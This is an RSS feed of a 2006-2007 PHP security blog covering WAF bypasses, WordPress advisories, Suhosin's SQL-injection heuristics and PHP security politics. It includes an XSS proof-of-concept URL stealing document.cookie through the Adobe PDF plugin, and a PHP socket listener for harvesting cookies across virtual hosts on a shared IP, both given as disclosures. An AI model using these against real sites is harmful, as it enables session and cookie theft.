<?xml version="1.0" encoding="utf-8" ?>
<rss version="2.0"
   xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
   xmlns:admin="http://webns.net/mvcb/"
   xmlns:dc="http://purl.org/dc/elements/1.1/"
   xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
   xmlns:wfw="http://wellformedweb.org/CommentAPI/"
   xmlns:content="http://purl.org/rss/1.0/modules/content/"
   >
<channel>
    <title>PHP Security Blog - PHP</title>
    <link>http://blog.php-security.org/</link>
    <description></description>
    <dc:language>en</dc:language>
    <admin:errorReportsTo rdf:resource="mailto:" />
    <generator>Serendipity 0.8.3 - http://www.s9y.org/</generator>
    
    <image>
        <url>http://blog.php-security.org/layout/default/img/s9y_banner_small.png</url>
        <title>RSS: PHP Security Blog - PHP - </title>
        <link>http://blog.php-security.org/</link>
        <width>100</width>
        <height>21</height>
    </image>
<item>
    <title>Modsecurity vs. PHP</title>
    <link>http://blog.php-security.org/archives/70-Modsecurity-vs.-PHP.html</link>
<category>PHP</category><category>Security</category>    <comments>http://blog.php-security.org/archives/70-Modsecurity-vs.-PHP.html#comments</comments>
    <wfw:comment>http://blog.php-security.org/wfwcomment.php?cid=70</wfw:comment>
    <slash:comments>4</slash:comments>
    <wfw:commentRss>http://blog.php-security.org/rss.php?version=2.0&amp;type=comments&amp;cid=70</wfw:commentRss>

    <author>blog-admin@nopiracy.de (Stefan Esser)</author>
    <content:encoded>
&lt;br /&gt;
There is a very funny posting at the modsecurity blog from yesterday that speaks a bit about the &lt;a href=&quot;http://www.modsecurity.org/blog/archives/2007/02/php_pecularitie.html&quot;&gt;combination PHP and modsecurity&lt;/a&gt;. Basically the entry tries to excuse the fact that most of the modsecurity rules that are in use today to protect against known vulnerabilites can be bypassed easily by simple things like adding spaces infront of the variable name.&lt;p&gt;&lt;br /&gt;It is quite amusing that the author blames the fact that web application firewalls parse the HTTP request in a different way than the installed application/script language (and therefore always contain bypass holes by design) onto the applications and languages. He especially blames PHP because it is so userfriendly when it comes to variable names.&lt;/p&gt;&lt;p /&gt;&lt;p&gt;&lt;br /&gt;I can understand that Ivan tries to defend his product. But fact is all webapplications/script languages have their own rules how they parse HTTP requests. modsecurity (and most probably other commerical web application firewalls) matches some of these understandings of HTTP partially but it does not match a single language 100% and therefore it will NEVER be secure. It is not feasible to have one parser that works on all languages because there are too many differences between the HTTP parsers.&lt;/p&gt;&lt;p&gt;&lt;br /&gt;Oh yeah... And I see no reason to especially blame PHP when a simple trick exists that works with many languages and allows getting a bunch of attacks through &lt;b&gt;all&lt;/b&gt; modsecurity rules...&lt;/p&gt;    </content:encoded>
    <pubDate>Tue, 06 Feb 2007 13:34:00 +0000</pubDate>
    <guid isPermaLink="false">http://blog.php-security.org/archives/70-guid.html</guid>
    </item>
<item>
    <title>Wordpress Security Update</title>
    <link>http://blog.php-security.org/archives/69-Wordpress-Security-Update.html</link>
<category>PHP</category><category>Security</category>    <comments>http://blog.php-security.org/archives/69-Wordpress-Security-Update.html#comments</comments>
    <wfw:comment>http://blog.php-security.org/wfwcomment.php?cid=69</wfw:comment>
    <slash:comments>10</slash:comments>
    <wfw:commentRss>http://blog.php-security.org/rss.php?version=2.0&amp;type=comments&amp;cid=69</wfw:commentRss>

    <author>blog-admin@nopiracy.de (Stefan Esser)</author>
    <content:encoded>
&lt;br /&gt;
&lt;p&gt;For all those not reading security mailinglists. It is time to upgrade your &lt;a href=&quot;http://www.wordpress.org&quot;&gt;WordPress&lt;/a&gt; blog (if you are among those, not using Serendipity). Today &lt;a href=&quot;http://wordpress.org/download/&quot;&gt;WordPress 2.0.6&lt;/a&gt; was released that fixes several security vulnerabilities. Among these security fixes are two dangerous vulnerabilities reported by us.&lt;/p&gt;&lt;p&gt;&lt;br /&gt;The first vulnerability is an XSS (Cross Site Scripting) hole in WordPress's own CSRF protection. &lt;a href=&quot;http://www.hardened-php.net/advisory_012007.140.html&quot;&gt;[READ MORE]&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;And the second vulnerability is a very interesting SQL injection. Very interesting, because it abuses charset conversion support to bypass the database escaping routines. Our demo exploit uses UTF-7. &lt;a href=&quot;http://www.hardened-php.net/advisory_022007.141.html&quot;&gt;[READ MORE]&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;br /&gt;Both vulnerabilities have the potential to compromise the admin account, which in case of WordPress might allow arbitrary PHP code execution due to WordPress features.&lt;/p&gt;    </content:encoded>
    <pubDate>Fri, 05 Jan 2007 21:42:00 +0000</pubDate>
    <guid isPermaLink="false">http://blog.php-security.org/archives/69-guid.html</guid>
    </item>
<item>
    <title>Universal XSS through Adobe PDF Plugin</title>
    <link>http://blog.php-security.org/archives/68-Universal-XSS-through-Adobe-PDF-Plugin.html</link>
<category>PHP</category><category>Security</category>    <comments>http://blog.php-security.org/archives/68-Universal-XSS-through-Adobe-PDF-Plugin.html#comments</comments>
    <wfw:comment>http://blog.php-security.org/wfwcomment.php?cid=68</wfw:comment>
    <slash:comments>13</slash:comments>
    <wfw:commentRss>http://blog.php-security.org/rss.php?version=2.0&amp;type=comments&amp;cid=68</wfw:commentRss>

    <author>blog-admin@nopiracy.de (Stefan Esser)</author>
    <content:encoded>
&lt;br /&gt;
It seems at the &lt;a href=&quot;http://events.ccc.de/congress/2006/Fahrplan/attachments/1158-Subverting_Ajax.pdf&quot;&gt;23C3 Stefano Di Paola has disclosed&lt;/a&gt; a universal XSS vulnerability through the Adobe PDF Plugin. Due to this vulnerability it is possible to launch XSS attacks against any site having PDF files. An example is for example:&lt;br /&gt;&lt;p&gt;&lt;br /&gt;&lt;a href=&quot;http://www.google.com/librariancenter/downloads/Tips_Tricks_85x11.pdf#something=javascript:alert(document.cookie);&quot;&gt;http://www.google.com/lib.../.../...5x11.pdf#s=javascript:alert(document.cookie);&lt;/a&gt;&lt;/p&gt;&lt;p /&gt;&lt;p&gt;&lt;br /&gt;The JavaScript is simply injected through a random variable appended to the URL fragment. Because of this vulnerability I strongly advise everyone to disable the use of the Adobe Acrobat PDF plugin in their browser. For firefox you can disable it within the Settings / Content / Filetypes menu. Just change the action performed for PDF, XPDF, FDF and everything else associated with the adobe acrobat plugin.&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;UPDATE:&lt;/b&gt; Just for the record. This issue has been fixed in the latest updates for the Adobe PDF Plugin.This does however not change the fact that the majority of users most probably still run vulnerable versions.&lt;/p&gt;&lt;br /&gt;
    </content:encoded>
    <pubDate>Wed, 03 Jan 2007 10:59:48 +0000</pubDate>
    <guid isPermaLink="false">http://blog.php-security.org/archives/68-guid.html</guid>
    </item>
<item>
    <title>Heuristic SQL Injection Detection for Suhosin</title>
    <link>http://blog.php-security.org/archives/67-Heuristic-SQL-Injection-Detection-for-Suhosin.html</link>
<category>PHP</category><category>Security</category>    <comments>http://blog.php-security.org/archives/67-Heuristic-SQL-Injection-Detection-for-Suhosin.html#comments</comments>
    <wfw:comment>http://blog.php-security.org/wfwcomment.php?cid=67</wfw:comment>
    <slash:comments>13</slash:comments>
    <wfw:commentRss>http://blog.php-security.org/rss.php?version=2.0&amp;type=comments&amp;cid=67</wfw:commentRss>

    <author>blog-admin@nopiracy.de (Stefan Esser)</author>
    <content:encoded>
&lt;br /&gt;
Today I added a little simple SQL Injection Detection Heuristic to the development version of the &lt;a href=&quot;http://www.suhosin.org&quot;&gt;Suhosin&lt;/a&gt; extension that can optionally log and block SQL queries. At the moment it is possible to log and/or block mysql(i) SQL queries that contain comments, comments that are not closed, queries with UNIONs or queries with multiple SELECT statements.&lt;p&gt;&lt;br /&gt;While this are very trivial checks they are very powerful and effective against a large number of SQL Injection attacks. Many PHP applications never have comments in their SQL statements, therefore any embedded comment and especially unclosed /* comments could be attempts to truncate the data after the injection point. The same is true for UNION and multiple SELECT statements (in subqueries). Both features are not used in the majority of open source PHP applications because they are not needed for the tasks or because compatibility with old MySQL versions was kept for a long time. Therefore an SQL Injection attack is very likely when either one is encountered.&lt;/p&gt;&lt;p /&gt;&lt;p&gt;&lt;br /&gt;Future versions of &lt;a href=&quot;http://www.suhosin.org&quot;&gt;Suhosin&lt;/a&gt; will have a learning mode that learns the structure of allowed SQL queries and will log/block all violating queries. The release of the next &lt;a href=&quot;http://www.suhosin.org&quot;&gt;Suhosin&lt;/a&gt; version that contains the simple heuristic and some bugfixes is planned for 1st January.&lt;br /&gt;
&lt;/p&gt;    </content:encoded>
    <pubDate>Thu, 28 Dec 2006 23:55:00 +0000</pubDate>
    <guid isPermaLink="false">http://blog.php-security.org/archives/67-guid.html</guid>
    </item>
<item>
    <title>Requested PHP Security Patches</title>
    <link>http://blog.php-security.org/archives/66-Requested-PHP-Security-Patches.html</link>
<category>PHP</category><category>Security</category>    <comments>http://blog.php-security.org/archives/66-Requested-PHP-Security-Patches.html#comments</comments>
    <wfw:comment>http://blog.php-security.org/wfwcomment.php?cid=66</wfw:comment>
    <slash:comments>7</slash:comments>
    <wfw:commentRss>http://blog.php-security.org/rss.php?version=2.0&amp;type=comments&amp;cid=66</wfw:commentRss>

    <author>blog-admin@nopiracy.de (Stefan Esser)</author>
    <content:encoded>
A few days ago one of our users requested that I look into some security features &lt;a href=&quot;http://bugs.php.net/bug.php?id=28932&quot;&gt;requested 2 years ago on bugs.php.net&lt;/a&gt; by Peter Brodersen. The first one is an addition to the session extension that stops attempts to access the session data of another user during SAFE MODE and the second one is a change in the behaviour of glob() to better obey SAFE MODE and open_basedir restrictions. In plain PHP glob() allows retrieving a list of all files on the server through the SAFE MODE or open_basedir error messages.&lt;p&gt;&lt;br /&gt;While I consider SAFE MODE and open_basedir broken solutions that should get replaced by proper UNIX file permissions I created two patches for both problems to make the users happy. The first problem is solved by appending the UID of the script to the session filename during safe_mode and the second one by performing silent safe_mode/open_basedir check for every single file. I did not bother commiting the patches into the PHP CVS because the bug was rejected several times as bogus.&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;a href=&quot;http://www.hardened-php.net/patches/glob_safe_mode_open_basedir_fix.patch&quot;&gt;glob_safe_mode_open_basedir_fix&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;http://www.hardened-php.net/patches/session_safe_mode_postfix.patch&quot;&gt;session_safe_mode_postfix&lt;/a&gt;&lt;br /&gt;&lt;/p&gt;    </content:encoded>
    <pubDate>Fri, 22 Dec 2006 23:51:00 +0000</pubDate>
    <guid isPermaLink="false">http://blog.php-security.org/archives/66-guid.html</guid>
    </item>
<item>
    <title>PHP Input Filtering Library</title>
    <link>http://blog.php-security.org/archives/65-PHP-Input-Filtering-Library.html</link>
<category>PHP</category><category>Security</category>    <comments>http://blog.php-security.org/archives/65-PHP-Input-Filtering-Library.html#comments</comments>
    <wfw:comment>http://blog.php-security.org/wfwcomment.php?cid=65</wfw:comment>
    <slash:comments>12</slash:comments>
    <wfw:commentRss>http://blog.php-security.org/rss.php?version=2.0&amp;type=comments&amp;cid=65</wfw:commentRss>

    <author>blog-admin@nopiracy.de (Stefan Esser)</author>
    <content:encoded>
&lt;br /&gt;
I wanted to announce that in 2007 the &lt;a href=&quot;http://www.hardened-php.net&quot;&gt;Hardened-PHP Project&lt;/a&gt; is going to create a few new security products. One will be a userspace PHP Input Filtering library that can be used in PHP 4 and PHP 5 for Input Filtering in a compatible way and that is not part of some framework, so that it can be easily used in your existing application. If you are interested in contributing don't hesitate to contact us by email.&lt;br /&gt;
    </content:encoded>
    <pubDate>Fri, 22 Dec 2006 14:35:00 +0000</pubDate>
    <guid isPermaLink="false">http://blog.php-security.org/archives/65-guid.html</guid>
    </item>
<item>
    <title>Why ext/filter?</title>
    <link>http://blog.php-security.org/archives/64-Why-extfilter.html</link>
<category>PHP</category><category>Security</category>    <comments>http://blog.php-security.org/archives/64-Why-extfilter.html#comments</comments>
    <wfw:comment>http://blog.php-security.org/wfwcomment.php?cid=64</wfw:comment>
    <slash:comments>19</slash:comments>
    <wfw:commentRss>http://blog.php-security.org/rss.php?version=2.0&amp;type=comments&amp;cid=64</wfw:commentRss>

    <author>blog-admin@nopiracy.de (Stefan Esser)</author>
    <content:encoded>
From time to time the ext/filter topic comes up. Yesterday one of its authors &lt;a href=&quot;http://blog.thepimp.net/index.php/post/2006/12/21/how-to-do-not-work-around-filter-dont-be-lazy-%3A&quot;&gt;was attacking serendipity&lt;/a&gt; for having code inside that bypasses ext/filter to get the original RAW values. Quite amusing how he claims the only correct way to do input filtering is to use the ext/filter functions and only use your own functions as a fallback. Infact the only sane way is the other way around: Have your own input filtering functions and do not even think about using ext/filter. There was actually never a need for ext/filter because everything it does can be implemented on a PHP level with plain PHP functions. ext/filter is just a new irritating API to already existing functionality, that potentially introduces new security holes, because it reimplements existing stuff again.&lt;br /&gt;&lt;p&gt;&lt;br /&gt;ext/filter is a similar stupid idea like magic_quotes_gpc. When you use it, the security of your application depends on the server configuration and no longer on your application code. And if you have similar input filtering functions to be compatible with servers that do not have ext/filter (which is the majority of all servers) then there is no reason at all to use ext/filter. Supporting ext/filter makes your code more complex and in case of a bug in ext/filter you have no chance to protect your users, because security only relies on the admin's will to upgrade. Considering the fact, that ext/filter is a builtin extension this means he has to recompile PHP.&lt;/p&gt;&lt;p&gt;&lt;br /&gt;Additionally ext/filter will keep a copy of all GPC variables in memory even when it is not used, therefore it is wise to add --disable-filter to your configure line if you do not want to waste ressources.&lt;br /&gt;
&lt;/p&gt;    </content:encoded>
    <pubDate>Fri, 22 Dec 2006 12:35:00 +0000</pubDate>
    <guid isPermaLink="false">http://blog.php-security.org/archives/64-guid.html</guid>
    </item>
<item>
    <title>PHP rips Safe Unlink Technique and Memory Canaries</title>
    <link>http://blog.php-security.org/archives/63-PHP-rips-Safe-Unlink-Technique-and-Memory-Canaries.html</link>
<category>PHP</category><category>Security</category>    <comments>http://blog.php-security.org/archives/63-PHP-rips-Safe-Unlink-Technique-and-Memory-Canaries.html#comments</comments>
    <wfw:comment>http://blog.php-security.org/wfwcomment.php?cid=63</wfw:comment>
    <slash:comments>13</slash:comments>
    <wfw:commentRss>http://blog.php-security.org/rss.php?version=2.0&amp;type=comments&amp;cid=63</wfw:commentRss>

    <author>blog-admin@nopiracy.de (Stefan Esser)</author>
    <content:encoded>
&lt;br /&gt;
I was quite amused today when I saw &lt;a href=&quot;http://cvs.php.net/viewvc.cgi/ZendEngine2/zend_alloc.c?r1=1.144.2.3.2.22&amp;r2=1.144.2.3.2.23&amp;diff_format=u&quot;&gt;a commit to the Zend Engine&lt;/a&gt; by Dmitry Stogov. With this commit PHP now has a safe unlink protection, a technique originally created by me for the glibc heap implementation in 2003, that was also ripped by Microsoft for XP-SP2. Basically the whole commit is a rip-off of a memory manager protection similiar to the one in &lt;a href=&quot;http://www.suhosin.org&quot;&gt;Suhosin&lt;/a&gt;. A protection that was always considered a no-no for vanilla PHP while I was among the PHP Security Response Team.&lt;p&gt;&lt;br /&gt;Yeah, well you do not need to be Harry Potter to guess what Zend is trying to do with this commit and why it is commited now. Fact is, that the people behind this patch have obviously not a security background and therefore it is not a suprise that the implementation violates several DONOTS that exist for heap protections. It is less secure than the one in &lt;a href=&quot;http://www.suhosin.org&quot;&gt;Suhosin&lt;/a&gt; and therefore it is quite likely that I will have to completely remove the code from this commit in future versions of our patch.&lt;/p&gt;&lt;p&gt;&lt;br /&gt;Actually one question remains. How does a safe_unlink and canary protection fit into the &amp;quot;PHP is secure&amp;quot; propaganda?&lt;/p&gt;    </content:encoded>
    <pubDate>Fri, 15 Dec 2006 20:00:00 +0000</pubDate>
    <guid isPermaLink="false">http://blog.php-security.org/archives/63-guid.html</guid>
    </item>
<item>
    <title>Cross Virtual Host Cookie Theft</title>
    <link>http://blog.php-security.org/archives/62-Cross-Virtual-Host-Cookie-Theft.html</link>
<category>PHP</category><category>Security</category>    <comments>http://blog.php-security.org/archives/62-Cross-Virtual-Host-Cookie-Theft.html#comments</comments>
    <wfw:comment>http://blog.php-security.org/wfwcomment.php?cid=62</wfw:comment>
    <slash:comments>40</slash:comments>
    <wfw:commentRss>http://blog.php-security.org/rss.php?version=2.0&amp;type=comments&amp;cid=62</wfw:commentRss>

    <author>blog-admin@nopiracy.de (Stefan Esser)</author>
    <content:encoded>
&lt;br /&gt;
Within a shared hosting environment it is &lt;strike&gt;sometimes&lt;/strike&gt; quite often possible to bind yourself to some high TCP port and accept incoming connections. Sometimes this is possible because you also get a shell account on the box and sometimes because dangerous PHP functions like stream_socket_server() are not disabled in the configuration. Unfortunately the ability to bind yourself to a port and receive connections is a threat to webapplications installed on different virtual hosts on the same IP, even if other security measures in place, like tight filesystem permissions or executing PHP script with the permission of the owner.&lt;p&gt;Consider the following PHP script, that will accept incoming connections on port 7778 and print out the connecting user's IP and the content he sends until an empty line.&lt;br /&gt;&lt;br /&gt;
&lt;/p&gt;&lt;pre&gt;&lt;code&gt;&lt;span style=&quot;color: rgb(0, 0, 0);&quot;&gt;&lt;span style=&quot;color: rgb(0, 0, 187);&quot;&gt;&amp;lt;?php&lt;br /&gt;  $socket &lt;/span&gt;&lt;span style=&quot;color: rgb(0, 119, 0);&quot;&gt;= &lt;/span&gt;&lt;span style=&quot;color: rgb(0, 0, 187);&quot;&gt;&lt;a target=&quot;blank&quot; title=&quot;resource stream_socket_server(string localaddress [, long &amp;errcode, string &amp;errstring, long flags, resource context])&quot; href=&quot;http://php.net/stream_socket_server&quot; class=&quot;phpref&quot;&gt;stream_socket_server&lt;/a&gt;&lt;/span&gt;&lt;span style=&quot;color: rgb(0, 119, 0);&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;color: rgb(221, 0, 0);&quot;&gt;&amp;quot;tcp://0.0.0.0:7778&amp;quot;&lt;/span&gt;&lt;span style=&quot;color: rgb(0, 119, 0);&quot;&gt;, &lt;/span&gt;&lt;span style=&quot;color: rgb(0, 0, 187);&quot;&gt;&lt;br /&gt;                                   $errno&lt;/span&gt;&lt;span style=&quot;color: rgb(0, 119, 0);&quot;&gt;, &lt;/span&gt;&lt;span style=&quot;color: rgb(0, 0, 187);&quot;&gt;$errstr&lt;/span&gt;&lt;span style=&quot;color: rgb(0, 119, 0);&quot;&gt;);&lt;br /&gt;  if (!&lt;/span&gt;&lt;span style=&quot;color: rgb(0, 0, 187);&quot;&gt;$socket&lt;/span&gt;&lt;span style=&quot;color: rgb(0, 119, 0);&quot;&gt;) {&lt;br /&gt;    echo &lt;/span&gt;&lt;span style=&quot;color: rgb(221, 0, 0);&quot;&gt;&amp;quot;$errstr ($errno)&amp;lt;br /&amp;gt;\n&amp;quot;&lt;/span&gt;&lt;span style=&quot;color: rgb(0, 119, 0);&quot;&gt;;&lt;br /&gt;  } else {&lt;br /&gt;    while (&lt;/span&gt;&lt;span style=&quot;color: rgb(0, 0, 187);&quot;&gt;$conn &lt;/span&gt;&lt;span style=&quot;color: rgb(0, 119, 0);&quot;&gt;= &lt;/span&gt;&lt;span style=&quot;color: rgb(0, 0, 187);&quot;&gt;&lt;a target=&quot;blank&quot; title=&quot;resource stream_socket_accept(resource serverstream, [ double timeout, string &amp;peername ])&quot; href=&quot;http://php.net/stream_socket_accept&quot; class=&quot;phpref&quot;&gt;stream_socket_accept&lt;/a&gt;&lt;/span&gt;&lt;span style=&quot;color: rgb(0, 119, 0);&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;color: rgb(0, 0, 187);&quot;&gt;$socket&lt;/span&gt;&lt;span style=&quot;color: rgb(0, 119, 0);&quot;&gt;)) {&lt;br /&gt;      echo &lt;/span&gt;&lt;span style=&quot;color: rgb(221, 0, 0);&quot;&gt;&amp;quot;&amp;lt;h3&amp;gt;&amp;quot;&lt;/span&gt;&lt;span style=&quot;color: rgb(0, 119, 0);&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;color: rgb(0, 0, 187);&quot;&gt;&lt;a target=&quot;blank&quot; title=&quot;string stream_socket_get_name(resource stream, bool want_peer)&quot; href=&quot;http://php.net/stream_socket_get_name&quot; class=&quot;phpref&quot;&gt;stream_socket_get_name&lt;/a&gt;&lt;/span&gt;&lt;span style=&quot;color: rgb(0, 119, 0);&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;color: rgb(0, 0, 187);&quot;&gt;$conn&lt;/span&gt;&lt;span style=&quot;color: rgb(0, 119, 0);&quot;&gt;, &lt;/span&gt;&lt;span style=&quot;color: rgb(0, 0, 187);&quot;&gt;true&lt;/span&gt;&lt;span style=&quot;color: rgb(0, 119, 0);&quot;&gt;)&lt;br /&gt;               .&lt;/span&gt;&lt;span style=&quot;color: rgb(221, 0, 0);&quot;&gt;&amp;quot;&amp;lt;/h3&amp;gt;&amp;lt;br /&amp;gt;\n&amp;quot;&lt;/span&gt;&lt;span style=&quot;color: rgb(0, 119, 0);&quot;&gt;;&lt;br /&gt;      do {&lt;br /&gt;        &lt;/span&gt;&lt;span style=&quot;color: rgb(0, 0, 187);&quot;&gt;$line &lt;/span&gt;&lt;span style=&quot;color: rgb(0, 119, 0);&quot;&gt;= &lt;/span&gt;&lt;span style=&quot;color: rgb(0, 0, 187);&quot;&gt;&lt;a target=&quot;blank&quot; title=&quot;Gets line from file pointer: string fgets(resource fp[, int length])&quot; href=&quot;http://php.net/fgets&quot; class=&quot;phpref&quot;&gt;fgets&lt;/a&gt;&lt;/span&gt;&lt;span style=&quot;color: rgb(0, 119, 0);&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;color: rgb(0, 0, 187);&quot;&gt;$conn&lt;/span&gt;&lt;span style=&quot;color: rgb(0, 119, 0);&quot;&gt;);&lt;br /&gt;        echo &lt;/span&gt;&lt;span style=&quot;color: rgb(0, 0, 187);&quot;&gt;$line &lt;/span&gt;&lt;span style=&quot;color: rgb(0, 119, 0);&quot;&gt;. &lt;/span&gt;&lt;span style=&quot;color: rgb(221, 0, 0);&quot;&gt;&amp;quot;&amp;lt;br /&amp;gt;\n&amp;quot;&lt;/span&gt;&lt;span style=&quot;color: rgb(0, 119, 0);&quot;&gt;;&lt;br /&gt;        &lt;/span&gt;&lt;span style=&quot;color: rgb(0, 0, 187);&quot;&gt;&lt;a target=&quot;blank&quot; title=&quot;Flush (send) the output buffer: bool ob_flush(void)&quot; href=&quot;http://php.net/ob_flush&quot; class=&quot;phpref&quot;&gt;ob_flush&lt;/a&gt;&lt;/span&gt;&lt;span style=&quot;color: rgb(0, 119, 0);&quot;&gt;(); &lt;/span&gt;&lt;span style=&quot;color: rgb(0, 0, 187);&quot;&gt;&lt;a target=&quot;blank&quot; title=&quot;Flush the output buffer: void flush(void)&quot; href=&quot;http://php.net/flush&quot; class=&quot;phpref&quot;&gt;flush&lt;/a&gt;&lt;/span&gt;&lt;span style=&quot;color: rgb(0, 119, 0);&quot;&gt;();&lt;br /&gt;      } while (!&lt;/span&gt;&lt;span style=&quot;color: rgb(0, 0, 187);&quot;&gt;&lt;a target=&quot;blank&quot; title=&quot;Tests for end-of-file on a file pointer: bool feof(resource fp)&quot; href=&quot;http://php.net/feof&quot; class=&quot;phpref&quot;&gt;feof&lt;/a&gt;&lt;/span&gt;&lt;span style=&quot;color: rgb(0, 119, 0);&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;color: rgb(0, 0, 187);&quot;&gt;$conn&lt;/span&gt;&lt;span style=&quot;color: rgb(0, 119, 0);&quot;&gt;) &amp;amp;&amp;amp; &lt;/span&gt;&lt;span style=&quot;color: rgb(0, 0, 187);&quot;&gt;&lt;a target=&quot;blank&quot; title=&quot;Get string length: int strlen(string str)&quot; href=&quot;http://php.net/strlen&quot; class=&quot;phpref&quot;&gt;strlen&lt;/a&gt;&lt;/span&gt;&lt;span style=&quot;color: rgb(0, 119, 0);&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;color: rgb(0, 0, 187);&quot;&gt;&lt;a target=&quot;blank&quot; title=&quot;Strip whitespace from the beginning and end of a string: string trim(string str [, string character_mask])&quot; href=&quot;http://php.net/trim&quot; class=&quot;phpref&quot;&gt;trim&lt;/a&gt;&lt;/span&gt;&lt;span style=&quot;color: rgb(0, 119, 0);&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;color: rgb(0, 0, 187);&quot;&gt;$line&lt;/span&gt;&lt;span style=&quot;color: rgb(0, 119, 0);&quot;&gt;))&amp;gt;&lt;/span&gt;&lt;span style=&quot;color: rgb(0, 0, 187);&quot;&gt;0&lt;/span&gt;&lt;span style=&quot;color: rgb(0, 119, 0);&quot;&gt;);&lt;br /&gt;      &lt;/span&gt;&lt;span style=&quot;color: rgb(0, 0, 187);&quot;&gt;&lt;a target=&quot;blank&quot; title=&quot;Closes an open file pointer: bool fclose(resource fp)&quot; href=&quot;http://php.net/fclose&quot; class=&quot;phpref&quot;&gt;fclose&lt;/a&gt;&lt;/span&gt;&lt;span style=&quot;color: rgb(0, 119, 0);&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;color: rgb(0, 0, 187);&quot;&gt;$conn&lt;/span&gt;&lt;span style=&quot;color: rgb(0, 119, 0);&quot;&gt;);&lt;br /&gt;    }&lt;br /&gt;    &lt;/span&gt;&lt;span style=&quot;color: rgb(0, 0, 187);&quot;&gt;&lt;a target=&quot;blank&quot; title=&quot;Closes an open file pointer: bool fclose(resource fp)&quot; href=&quot;http://php.net/fclose&quot; class=&quot;phpref&quot;&gt;fclose&lt;/a&gt;&lt;/span&gt;&lt;span style=&quot;color: rgb(0, 119, 0);&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;color: rgb(0, 0, 187);&quot;&gt;$socket&lt;/span&gt;&lt;span style=&quot;color: rgb(0, 119, 0);&quot;&gt;);&lt;br /&gt;  }&lt;/span&gt;&lt;span style=&quot;color: rgb(0, 0, 187);&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p /&gt;&lt;p&gt;Now guess what happens when you connect with your browser to http://my.bookshop.shop:7778/ which happens to share the same IP with your script. The browser will connect to the port under your control and send it's HTTP headers to your script. Unfortunately this HTTP headers will also contain the cookie stored for http://my.bookshop.shop/ because browsers do not save the port number of the HTTP server that orginally set the cookie. This enables anyone on the same IP with the ability to accept connections to steal cookies from other people's webapplications.&lt;/p&gt;&lt;p&gt;&lt;br /&gt;A trivial but annoying trick. And considering how many people are vulnerable to URL Include vulnerabilities you can be pretty sure that the majority of PHP5 hosting servers will allow stream_socket_server(). &lt;/p&gt;    </content:encoded>
    <pubDate>Fri, 15 Dec 2006 01:59:00 +0000</pubDate>
    <guid isPermaLink="false">http://blog.php-security.org/archives/62-guid.html</guid>
    </item>
<item>
    <title>Retired from security@php.net</title>
    <link>http://blog.php-security.org/archives/61-Retired-from-securityphp.net.html</link>
<category>PHP</category><category>Security</category>    <comments>http://blog.php-security.org/archives/61-Retired-from-securityphp.net.html#comments</comments>
    <wfw:comment>http://blog.php-security.org/wfwcomment.php?cid=61</wfw:comment>
    <slash:comments>0</slash:comments>
    <wfw:commentRss>http://blog.php-security.org/rss.php?version=2.0&amp;type=comments&amp;cid=61</wfw:commentRss>

    <author>blog-admin@nopiracy.de (Stefan Esser)</author>
    <content:encoded>
&lt;br /&gt;
&lt;p&gt;Last night I finally retired from the PHP Security Response Team, that was initially my idea a few years ago.&lt;/p&gt;&lt;p&gt;&lt;br /&gt;The reasons for this are many, but the most important one is that I have realised that any attempt to improve the security of PHP from the inside is futile. The PHP Group will jump into your boat as soon you try to blame PHP's security problems on the user but the moment you criticize the security of PHP itself you become persona non grata. I stopped counting the times I was called immoral traitor for disclosing security holes in PHP or for developing &lt;a href=&quot;http://www.suhosin.org&quot;&gt;Suhosin&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;&lt;br /&gt;For the ordinary PHP user this means that I will no longer hide the slow response time to security holes in my advisories. It will also mean that some of my advisories will come without patches available, because the PHP Security Response Team refused to fix them for months. It will also mean that there will be a lot more advisories about security holes in PHP.&lt;/p&gt;&lt;br /&gt;
    </content:encoded>
    <pubDate>Sat, 09 Dec 2006 10:58:00 +0000</pubDate>
    <guid isPermaLink="false">http://blog.php-security.org/archives/61-guid.html</guid>
    </item>
<item>
    <title>del.icio.us doesn't care about security</title>
    <link>http://blog.php-security.org/archives/60-del.icio.us-doesnt-care-about-security.html</link>
<category>PHP</category><category>Security</category>    <comments>http://blog.php-security.org/archives/60-del.icio.us-doesnt-care-about-security.html#comments</comments>
    <wfw:comment>http://blog.php-security.org/wfwcomment.php?cid=60</wfw:comment>
    <slash:comments>14</slash:comments>
    <wfw:commentRss>http://blog.php-security.org/rss.php?version=2.0&amp;type=comments&amp;cid=60</wfw:commentRss>

    <author>blog-admin@nopiracy.de (Stefan Esser)</author>
    <content:encoded>
&lt;br /&gt;
When you report an XSS security problem in a web 2.0 site you usually assume it will get fixed as soon as possible. Obviously the guys at del.icio.us think different...&lt;br /&gt;
&lt;br /&gt;&lt;a href=&quot;http://blog.php-security.org/archives/60-guid.html#extended&quot;&gt;Continue reading &quot;del.icio.us doesn't care about security&quot;&lt;/a&gt;    </content:encoded>
    <pubDate>Fri, 08 Dec 2006 14:17:00 +0000</pubDate>
    <guid isPermaLink="false">http://blog.php-security.org/archives/60-guid.html</guid>
    </item>
<item>
    <title>Sometimes you better shut up</title>
    <link>http://blog.php-security.org/archives/59-Sometimes-you-better-shut-up.html</link>
<category>PHP</category><category>Security</category>    <comments>http://blog.php-security.org/archives/59-Sometimes-you-better-shut-up.html#comments</comments>
    <wfw:comment>http://blog.php-security.org/wfwcomment.php?cid=59</wfw:comment>
    <slash:comments>1</slash:comments>
    <wfw:commentRss>http://blog.php-security.org/rss.php?version=2.0&amp;type=comments&amp;cid=59</wfw:commentRss>

